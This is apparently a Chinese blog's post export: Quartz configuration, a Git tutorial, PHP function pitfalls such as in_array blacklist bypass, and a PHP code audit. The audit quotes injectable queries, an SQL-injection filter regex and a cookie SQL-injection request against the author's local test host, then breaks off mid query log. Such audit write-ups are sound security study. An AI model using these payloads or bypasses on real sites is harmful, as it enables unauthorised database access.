class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1atd3.org</span><br><span class="line">127.0.0.1www.atd3.org</span><br><span class="line">127.0.0.1suda.atd3.org</span><br><span class="line">127.0.0.1xctf.atd3.org</span><br><span class="line">127.0.0.1think.atd3.org</span><br><span class="line">127.0.0.1school.atd3.org</span><br><span class="line">127.0.0.1code4a.atd3.org</span><br><span class="line">127.0.0.1jdzx.atd3.org</span><br><span class="line">127.0.0.1ctftp.atd3.org</span><br><span class="line">127.0.0.1apartment.atd3.org</span><br><span class="line">127.0.0.1qq.atd3.org</span><br><span class="line">127.0.0.1apartment.dxkite.org</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SpringBoot 2 中使用 Quartz</title>
      <link href="/2018/07/26/springboot2-with-quartz/"/>
      <url>/2018/07/26/springboot2-with-quartz/</url>
      <content type="html"><![CDATA[<p>这几天在写SpringBoot项目，突然把SpringBoot从1.x更新到了2.x出了一堆的问题，本文讲一下Quartz升级版本后的配置</p><a id="more"></a><h2 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h2><p>在 SpringBoot 1.x 的时候引入依赖是这样的： </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.quartz-scheduler<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;quartz.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.quartz-scheduler<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quartz-jobs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;quartz.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBoot 2.x 改成了这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-quartz<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>改成这样的后果就是，不用自己用代码配置了。省去了配置各种东西的时间（妈耶，前两天白弄了）</p><h2 id="配置文件变化"><a href="#配置文件变化" class="headerlink" title="配置文件变化"></a>配置文件变化</h2><p>在 SpringBoot 1.x 的时候使用的是  <code>org.quartz.xx</code> , 还要自己放到文件<code>quartz.properties</code>里面去，再引用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">org.quartz.scheduler.instanceId = AUTO</span><br><span class="line">org.quartz.scheduler.instanceName = DefaultQuartzScheduler</span><br><span class="line">org.quartz.threadPool.class = org.quartz.simpl.SimpleThreadPool</span><br><span class="line">org.quartz.threadPool.threadCount = 50</span><br><span class="line">org.quartz.threadPool.threadPriority = 5</span><br><span class="line">org.quartz.threadPool.threadsInheritContextClassLoaderOfInitializingThread = true</span><br><span class="line">org.quartz.jobStore.isClustered = true</span><br><span class="line">org.quartz.jobStore.misfireThreshold = 60000</span><br><span class="line">org.quartz.jobStore.clusterCheckinInterval = 20000</span><br><span class="line">org.quartz.jobStore.class = org.quartz.impl.jdbcjobstore.JobStoreTX</span><br><span class="line">org.quartz.jobStore.driverDelegateClass = org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span><br><span class="line">org.quartz.jobStore.selectWithLockSQL = SELECT * FROM &#123;0&#125;LOCKS WHERE LOCK_NAME = ? FOR UPDATE</span><br><span class="line">org.quartz.jobStore.tablePrefix = QRTZ_</span><br></pre></td></tr></table></figure><p>吐血三升。在SpringBoot2.x中配置文件和配置项都变了，改到 <code>application.properties</code> 里面，配置项的前缀和属性也变了很多：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">spring.quartz.properties.org.quartz.scheduler.instanceName=clusteredScheduler</span><br><span class="line">spring.quartz.properties.org.quartz.scheduler.instanceId=AUTO</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.class=org.quartz.impl.jdbcjobstore.JobStoreTX</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.driverDelegateClass=org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.tablePrefix=QRTZ_</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.isClustered=true</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.clusterCheckinInterval=10000</span><br><span class="line">spring.quartz.properties.org.quartz.jobStore.useProperties=false</span><br><span class="line">spring.quartz.properties.org.quartz.threadPool.class=org.quartz.simpl.SimpleThreadPool</span><br><span class="line">spring.quartz.properties.org.quartz.threadPool.threadCount=10</span><br><span class="line">spring.quartz.properties.org.quartz.threadPool.threadPriority=5</span><br><span class="line">spring.quartz.properties.org.quartz.threadPool.threadsInheritContextClassLoaderOfInitializingThread=true</span><br><span class="line">spring.quartz.job-store-type=jdbc</span><br></pre></td></tr></table></figure><p>这样的话就自动集成了 Quartz 功能。</p><blockquote><p>讲道理配置用 yaml 感觉更加好？</p></blockquote><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line"><span class="attr">    quartz:</span></span><br><span class="line"><span class="attr">        job-store-type:</span> <span class="string">jdbc</span></span><br><span class="line"><span class="attr">        properties:</span></span><br><span class="line"><span class="attr">            org:</span></span><br><span class="line"><span class="attr">                quartz:</span></span><br><span class="line"><span class="attr">                    jobStore:</span></span><br><span class="line"><span class="attr">                        class:</span> <span class="string">org.quartz.impl.jdbcjobstore.JobStoreTX</span></span><br><span class="line"><span class="attr">                        clusterCheckinInterval:</span> <span class="number">10000</span></span><br><span class="line"><span class="attr">                        driverDelegateClass:</span> <span class="string">org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span></span><br><span class="line"><span class="attr">                        isClustered:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">                        tablePrefix:</span> <span class="string">QRTZ_</span></span><br><span class="line"><span class="attr">                        useProperties:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">                    scheduler:</span></span><br><span class="line"><span class="attr">                        instanceId:</span> <span class="string">AUTO</span></span><br><span class="line"><span class="attr">                        instanceName:</span> <span class="string">clusteredScheduler</span></span><br><span class="line"><span class="attr">                    threadPool:</span></span><br><span class="line"><span class="attr">                        class:</span> <span class="string">org.quartz.simpl.SimpleThreadPool</span></span><br><span class="line"><span class="attr">                        threadCount:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">                        threadPriority:</span> <span class="number">5</span></span><br><span class="line"><span class="attr">                        threadsInheritContextClassLoaderOfInitializingThread:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>配置文件装换工具：<a href="http://www.toyaml.com/" target="_blank" rel="noopener">http://www.toyaml.com/</a> （提供 properties 与 yaml 的互相装换）</p>]]></content>
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> SpringBoot 2.0 </tag>
            
            <tag> Quartz </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Git与Github的简单使用</title>
      <link href="/2018/07/20/basic-use-of-git/"/>
      <url>/2018/07/20/basic-use-of-git/</url>
      <content type="html"><![CDATA[<p>作为一个程序员，版本管理系统我们都要得会啊，本次教一下简单的Git功能的使用</p><p>Git 是一个比较流行的代码版本管理系统</p><a id="more"></a><h2 id="注册一个Github账号"><a href="#注册一个Github账号" class="headerlink" title="注册一个Github账号"></a>注册一个Github账号</h2><p>在开始本教程之前，可以先去Github注册一个账号: <a href="https://github.com" target="_blank" rel="noopener">https://github.com</a> ，英文的网站，如果不熟悉的话可以去 <a href="https://gitee.com" target="_blank" rel="noopener">码云</a>、<a href="http://coding.net" target="_blank" rel="noopener">Coding</a> 去注册账号、注册完成以后就可以浪了</p><h2 id="创建一个代码仓库"><a href="#创建一个代码仓库" class="headerlink" title="创建一个代码仓库"></a>创建一个代码仓库</h2><p>在首页找到 <code>+</code> 号，点击后有一个 <code>New repository</code> </p><p><img src="0.png" alt=""></p><p>点击后出现如下界面 也可以点击访问：<a href="https://github.com/new" target="_blank" rel="noopener">https://github.com/new</a> </p><p><img src="1.png" alt=""></p><p>填写后即可创建一个代码仓库，创建成功后出现如下界面，复制红框的部分 （<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:DXkite/homework.git）</p><p><img src="2.png" alt=""></p><h2 id="Git安装配置"><a href="#Git安装配置" class="headerlink" title="Git安装配置"></a>Git安装配置</h2><p>安装如下软件</p><ul><li><strong>Github Desktop</strong> <a href="https://desktop.github.com/" target="_blank" rel="noopener">https://desktop.github.com/</a> <a href="https://central.github.com/deployments/desktop/desktop/latest/win32" target="_blank" rel="noopener">Windows版本 点击下载</a></li><li><strong>Git</strong> <a href="https://www.git-scm.com/download/" target="_blank" rel="noopener">https://www.git-scm.com/download/</a> <a href="https://github.com/git-for-windows/git/releases/download/v2.18.0.windows.1/Git-2.18.0-64-bit.exe" target="_blank" rel="noopener">Windows版本 点击下载</a></li></ul><p>全部安装，安装配置选择默认配置即可，安装完成后登陆 </p><p><img src="3.png" alt=""></p><p>登陆成功后，会要你配置Git，填写你注册时的账号邮箱即可</p><p><img src="4.png" alt=""></p><p>点击 Continue 之后即可，点击 Finish 完成</p><h2 id="配置SSH登陆"><a href="#配置SSH登陆" class="headerlink" title="配置SSH登陆"></a>配置SSH登陆</h2><p>选择一个文件夹（最好是放代码的地方），右键鼠标，选择 Git Bash Here</p><p><img src="/images/placeholder.png" alt="" data-src="5.png" class="lazyload"></p><p>输入运行命令 <code>ssh-keygen</code>，然后一直回车就行 </p><p><img src="/images/placeholder.png" alt="" data-src="6.png" class="lazyload"></p><p>然后找到上图的 id_rsa.pub 文件 <code>/c/Users/DXkite/.ssh/id_rsa.pub</code> 既在 <code>C:/Users/DXkite/.ssh/id_rsa.pub</code></p><p>打开文件，复制文件内容</p><p><img src="/images/placeholder.png" alt="" data-src="7.png" class="lazyload"></p><p>打开Github，选择 Settinng</p><p><img src="/images/placeholder.png" alt="" data-src="8.png" class="lazyload"></p><p>选择 New SSH Key</p><p><img src="/images/placeholder.png" alt="" data-src="9.png" class="lazyload"></p><p>填上内容后点击  <code>Add SSH Key</code></p><p><img src="/images/placeholder.png" alt="" data-src="10.png" class="lazyload"></p><p>点击后会出现一个提示，输入密码，即可，在刚刚的窗口输入命令 <code>ssh git@github.com</code>，可能会要你输入<code>yes</code></p><p><img src="/images/placeholder.png" alt="" data-src="11.png" class="lazyload"></p><p>出现如上提示即可</p><h2 id="克隆并上传第一个提交"><a href="#克隆并上传第一个提交" class="headerlink" title="克隆并上传第一个提交"></a>克隆并上传第一个提交</h2><h3 id="克隆仓库"><a href="#克隆仓库" class="headerlink" title="克隆仓库"></a>克隆仓库</h3><p>还记得之前复制的红框部分么（<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:DXkite/homework.git）？现在需要使用命令运行一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone [红框部分]</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="/images/placeholder.png" alt="" data-src="12.png" class="lazyload"></p><p>可以发现文件夹内会新建了一个文件夹，打开后，编辑 <code>README.md</code></p><p><img src="/images/placeholder.png" alt="" data-src="13.png" class="lazyload"></p><p>修改后，在这个文件夹打开 Git Bash </p><p>运行命令 <code>git status</code> ，可以看到仓库的状态</p><blockquote><p><strong>git status</strong> 用来获取当前仓库的状态</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="14.png" class="lazyload"></p><blockquote><p><strong>git add .</strong> 把文件添加到仓库<br><strong>git commit -m “提交信息”</strong> 添加一个提交</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="15.png" class="lazyload"></p><blockquote><p><strong>git push origin master</strong> 把提交上传到Github</p></blockquote><p><img src="/images/placeholder.png" alt="" data-src="16.png" class="lazyload"></p><p>提交完成后，可以查看你的仓库的文件变化 </p><p><img src="/images/placeholder.png" alt="" data-src="17.png" class="lazyload"></p><h3 id="使用Github-Desktop-提交"><a href="#使用Github-Desktop-提交" class="headerlink" title="使用Github Desktop 提交"></a>使用Github Desktop 提交</h3><p>修改文件后，打开 Github Desktop 操作内容如下：</p><p><img src="/images/placeholder.png" alt="" data-src="18.png" class="lazyload"></p><p><img src="/images/placeholder.png" alt="" data-src="19.png" class="lazyload"></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP函数的默认行为</title>
      <link href="/2018/07/19/php-function-default-behavior/"/>
      <url>/2018/07/19/php-function-default-behavior/</url>
      <content type="html"><![CDATA[<p>函数的默认行为有时候会被忽略掉，但是造成的安全问题也是有点东西的；本次讲三个函数默认行为：<code>class_exists</code>、<code>in_array</code>、<code>preg_quote</code>。</p><a id="more"></a><h2 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h2><blockquote><p>bool class_exists ( string $class_name [, bool $autoload = true ] )</p></blockquote><p>函数功能：判断类是否存在<br>默认行为：调用自动加载函数 <code>__autoload</code> 或者调用 <code>spl_autoload_register</code> 注册过的自动加载函数。</p><p><em>函数代码</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_autoload</span><span class="params">(string $name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'call --&gt; '</span>.<span class="keyword">__FUNCTION__</span>.<span class="string">'('</span>.$name.<span class="string">')'</span>.<span class="string">"\r\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(<span class="string">'my_autoload'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'with default = true'</span>.<span class="string">"\r\n"</span>;</span><br><span class="line">var_dump(class_exists(<span class="string">'Some'</span>)) ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'with default = false'</span>.<span class="string">"\r\n"</span>;</span><br><span class="line">var_dump(class_exists(<span class="string">'Some'</span>,<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure><p><em>运行结果</em></p><h2 id="in-array"><a href="#in-array" class="headerlink" title="in_array"></a>in_array</h2><blockquote><p>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</p></blockquote><p>函数功能：判断值是否在数组中<br>默认行为：非严格判断是否相同（自带类型装换）</p><p><em>函数代码</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数字绕过</span></span><br><span class="line">var_dump(in_array(<span class="string">'5_val'</span>,range(<span class="number">0</span>,<span class="number">10</span>)));</span><br><span class="line"><span class="comment"># 黑名单绕过</span></span><br><span class="line">var_dump(in_array(<span class="string">'5.php'</span>,[<span class="string">'php'</span>,<span class="string">'png'</span>,<span class="string">'jpg'</span>]));</span><br><span class="line">var_dump(in_array(<span class="string">'5_val'</span>,range(<span class="number">0</span>,<span class="number">10</span>),<span class="keyword">true</span>));</span><br></pre></td></tr></table></figure><h2 id="preg-quote"><a href="#preg-quote" class="headerlink" title="preg_quote"></a>preg_quote</h2><blockquote><p>string preg_quote ( string $str [, string $delimiter = NULL ] )</p></blockquote><p>函数功能：转义每个正则表达式语法中的字符<br>默认行为：只转义 <code>. \ + * ? [ ^ ] $ ( ) { } = ! &lt; &gt; | : -</code></p><p><em>函数代码</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/'</span>.preg_quote(<span class="string">'x./.'</span>).<span class="string">'/i'</span>,<span class="string">'sox./text'</span>);</span><br><span class="line">preg_match(<span class="string">'/'</span>.preg_quote(<span class="string">'x./.'</span>,<span class="string">'/'</span>).<span class="string">'/i'</span>,<span class="string">'sox./text'</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> PHP </tag>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP - 简单代码审计</title>
      <link href="/2018/07/18/simple-code-audit/"/>
      <url>/2018/07/18/simple-code-audit/</url>
      <content type="html"><![CDATA[<p>翻网盘的时候翻到了一堆 <code>代挂网站源码</code> ，大概是以前和别人合作的时候别人给的参考网站，现在对其中部分代码进行一次简单的代码审计，本次主要审计外部变量造成的SQL注入，运行环境版本为 <code>PHP5</code><br><a id="more"></a><br>程序代码给出下载：</p><p><a href="天高云淡V2免授权版1.20.7z">天高云淡V2免授权版1.20.7z</a></p><h2 id="PHP的外部变量"><a href="#PHP的外部变量" class="headerlink" title="PHP的外部变量"></a>PHP的外部变量</h2><table><thead><tr><th>变量名</th><th>说明</th></tr></thead><tbody><tr><td>$_SERVER</td><td>记录服务器信息</td></tr><tr><td>$_POST</td><td>记录请求表单</td></tr><tr><td>$_GET</td><td>记录请求GET参数</td></tr><tr><td>$_COOKIE</td><td>记录请求的Cookies</td></tr></tbody></table><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>一般来说，对于源代码中的外部变量遵循一个铁则：</p><blockquote><p>永远不要相信用户的输入</p></blockquote><p>本次利用 <code>NotePad++</code> 对代码进行搜索并分析上下文来确定是否包含SQL注入。</p><p><em>搜索变量</em></p><p><img src="1.png" alt=""></p><h2 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h2><p>一般来说，比较简单的PHP网站，一个PHP文件一个页面，没有使用框架，就基本上不会对外部变量进行过滤，从代码来看，代码的作者至少有3位：</p><p><strong>转义函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safestr</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())&#123;</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p><code>addslashes</code>() 函数返回在预定义字符之前添加反斜杠的字符串。</p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><p>默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 <code>addslashes</code>()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。</p><p>可以看到这里对输入的字符串进行一次过滤，使用的地方如：</p><blockquote><p>/find.php:1~6<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'includes/common.php'</span>);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'do'</span>]==<span class="string">'find'</span>)&#123;</span><br><span class="line">session_start();</span><br><span class="line">$user=safestr($_POST[<span class="string">'user'</span>]);</span><br><span class="line">$aqanswer=safestr($_POST[<span class="string">'aqanswer'</span>]);</span><br></pre></td></tr></table></figure></p></blockquote><p>但是也有未使用的地方（此管理目录，虽然有注入点，但是需要管理员权限才可运行）：</p><blockquote><p>/admin/addfz.php:13~15<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$d_qq = $_POST[<span class="string">'d_qq'</span>];</span><br><span class="line">$d_user_name = $_POST[<span class="string">'d_user_name'</span>];</span><br><span class="line">$d_user_pwd = $_POST[<span class="string">'d_user_pwd'</span>];</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>安全检测</strong></p><p>此份代码里包含了安全检测部分，检测输入变量是否包含恶意字符：</p><blockquote><p>/includes/360_safe3.php</p></blockquote><p><em>部分代码</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="审计结果"><a href="#审计结果" class="headerlink" title="审计结果"></a>审计结果</h2><p>从代码静态审计来看，注入点比较多，例如：</p><blockquote><p>/mgmt/qd.php:17 注入参数： POST:uin<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$qq=$_POST[<span class="string">'uin'</span>];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!$qqrow=$db-&gt;get_row(<span class="string">"select * from &#123;$prefix&#125;qqs where qq='$qq' and uid='$userrow[uid]' limit 1"</span>)) &#123;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="可用注入"><a href="#可用注入" class="headerlink" title="可用注入"></a>可用注入</h3><blockquote><p>/includes/common.php:77 注入参数：COOKIE:tgyd_sid <strong>可用</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$cookiesid = $_COOKIE[<span class="string">'tgyd_sid'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cookiesid &amp;&amp; $userrow = $db-&gt;get_row(<span class="string">"select * from &#123;$prefix&#125;users where sid ='$cookiesid' limit 1"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    C(<span class="string">'loginuser'</span>, $userrow[<span class="string">'user'</span>]);</span><br><span class="line"></span><br><span class="line">    C(<span class="string">'loginuid'</span>, $userrow[<span class="string">'uid'</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="POST-实列"><a href="#POST-实列" class="headerlink" title="POST 实列"></a>POST 实列</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET http://qq.atd3.org/includes/common.php HTTP/1.1</span><br><span class="line">Host: qq.atd3.org</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie:tgyd_sid=1&apos; or 1%3B --- </span><br><span class="line">X-Forwarded-For: 222.222.112.1</span><br></pre></td></tr></table></figure><h3 id="注入日志"><a href="#注入日志" class="headerlink" title="注入日志"></a>注入日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">180718 12:32:12   16 Connectroot@localhost on </span><br><span class="line">   16 Init DBqq_tgyd</span><br><span class="line">   16 Queryset names utf8</span><br><span class="line">   16 Queryselect * from tgyd_separate where urls=&apos;qq.atd3.org&apos; limit 1</span><br><span class="line">   16 Queryselect * from tgyd_webconfigs</span><br><span class="line">   16 Queryselect * 